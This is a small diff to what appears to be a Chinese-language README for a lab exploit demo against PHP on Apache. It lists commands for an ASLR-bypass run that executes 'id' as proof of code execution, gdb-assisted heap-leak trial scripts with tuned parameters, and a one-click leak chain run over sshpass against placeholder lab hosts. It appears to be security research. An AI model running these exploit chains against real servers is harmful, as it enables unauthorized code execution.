@@ -23,11 +23,13 @@ CMD="id>/tmp/p1" bash tools/pure_aslr_run.sh
 # sshpass -p '<LAB_PASSWORD>' ssh -t <LAB_USER>@<LAB_HOST> 'bash ~/demo_aslr_video.sh'
 
 # 3) display_errors=0 堆泄漏（需 gdb；A-only 与 A+B forge）
-# 4) display_errors=0 一键链（只校验 display_errors=0，绝不修改配置）
-#    sshpass -p '<LAB_PASSWORD>' ssh -t <LAB_USER>@<LAB_HOST> 'bash ~/demo_de0_leak.sh'
 ./tools/trial_bins.sh 0 62 235 15000 208 0 4000 103
 BN=160 BVL=231 BB1_LEN=1048551 BF_P1=256 BF_READ=4000 \
   ./tools/trial_ab.sh 0 62 235 15000 208 0 4000 103
+
+# 4) display_errors=0 一键链（只校验 display_errors=0，绝不修改配置；输出 chunk base）
+#    sshpass -p '<LAB_PASSWORD>' ssh -t <LAB_USER>@<LAB_HOST> 'bash ~/demo_de0_leak.sh'
+
 ```
 
 > 步骤 3 的 `trial_*.sh` 会重启本机 Apache 并挂 gdb，仅用于校准/取证；
